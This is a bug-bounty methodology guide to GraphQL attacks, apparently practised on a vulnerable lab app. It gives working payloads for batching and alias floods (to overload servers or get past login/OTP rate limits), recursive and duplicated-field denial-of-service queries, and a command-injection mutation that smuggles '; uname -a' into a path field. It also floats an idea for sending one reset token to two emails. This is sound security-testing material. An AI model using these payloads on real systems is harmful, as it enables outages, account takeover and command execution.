
# 1 - Batch Query Attacks

If a resource intensive GraphQL query is identified, batch processing can be used to call the query and potentially overwhelm the service for a prolonged period of time.

```
data = [
{"query":"query {\n  systemUpdate\n}","variables":[]},
{"query":"query {\n  systemUpdate\n}","variables":[]},
{"query":"query {\n  systemUpdate\n}","variables":[]}
]
requests.post('http://host/graphql', json=data)
```

### Aliases based Attack
If batching is disabled, use [aliases](https://portswigger.net/web-security/graphql#bypassing-rate-limiting-using-aliases), if the server is not analyzing the cost of the query, it can be used to DOS, or it can be used to bypass rate limiting on Login, OTP...

```
query {
  t1:systemUpdate
  t2:systemUpdate
  t3:systemUpdate
  t4:systemUpdate
}
```

> [!NOTE]
> if Cost Query Analysis is enabled, it should prevent running batched queries.


# 2 - Denial of Service
### 2.1 :: Deep Recursion Query Attack
If The application offers two types, which reference eachother (Type1 has Type2, and Type2 has Type1), it recursive query to be executed successfully.

![Example](https://github.com/0xGLSS/Bug-Bounty-Methodology/assets/85647797/cc9686ca-662c-4327-95c6-e2e47ceca255)

```
query {
  pastes {
    owner {
      pastes {
        owner {
          pastes {
            owner {
              pastes {
                owner {
                  pastes {
                    owner {
                      pastes {
                        owner {
                          name
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```
> [!NOTE]
> if a depth check is implemented it should prevent malicious queries from going through.

### 2.2 :: Resource Intensive Query Attack
Some queries may be computationally more expensive than others, as they would trigger more complex backend logic in order to fulfill the query resolution. we can abuse it by calling these actions frequently in order to cause resource exhaustion.
```
query {
  t1:systemUpdate
}
```
Execution Time :: 81 seconds
> [!NOTE]
> if Query Cost Analysis protection is implemented it should it!
### 2.3 Field Duplication Attack
Various GraphQL implementation do not bother de-duplicating repeating fields in GraphQL, allowing the user to multiply the same requested fields as they wish.
```
query {
  pastes {
    owner {
      pastes {
            ipAddr # 1
            ipAddr # 2
            ipAddr # 3
            ipAddr # 4
            ipAddr # 1000
          }
        }
    }
}
```

### 2.4 Circular Fragment
The GraphQL API allows creating circular fragments, such that two fragments are cross-referencing eachother. When a Spread Operator (...) references a fragment, which in return references a 2nd fragment that leads to the former fragment, may cause a recursive loop and crash the server.

Resources
 GraphQL Specification - Fragments Must Not Form Cycles
 GraphQL Cop - Security Auditing Tool for GraphQL

# 3 Information Disclosure
### 3.1 GraphQL suggestions
when Introspection is not allowed suggesstions can be used togain more insight into GraphQL's schema, 
[Clairvoyance - GQL Security tool for field enumeration](https://github.com/nikitastupin/clairvoyance)


### 3.2 GraphQL Interface
GraphiQL is usually found in paths such as: /graphiql or /console, however it can be found in [other places too](https://raw.githubusercontent.com/anmolksachan/anmolksachan.github.io/main/graphql/graphql-common.txt)


# 4 - OWASP
### 4.1 CSRF
Doesn't differ from regular [CSRF](https://portswigger.net/web-security/graphql#graphql-csrf) 
### 4.1 OS Command Injection
```
mutation  {
  importPaste(host:"localhost", port:80, path:"/ ; uname -a", scheme:"http"){
    result
  }
}
```
SSRF, SQLi, XSS, Path Traversal
## Refrences
- [GraphQL Batching attack](https://lab.wallarm.com/graphql-batching-attack/)

## Tools
- ShapeShifter - GQL Security tool for Schema Extraction
- Clairvoyance - GraphQL Schema Enumeration Discovery Tool
- graphw00f - GraphQL Fingerprinting Tool
- https://github.com/dolevf/graphql-cop.gitDirective OverloadingDirective Overloading

## Ideas:
- Send same reset password token to 2 emails (similar to race condition) using GraphQL Batching attack

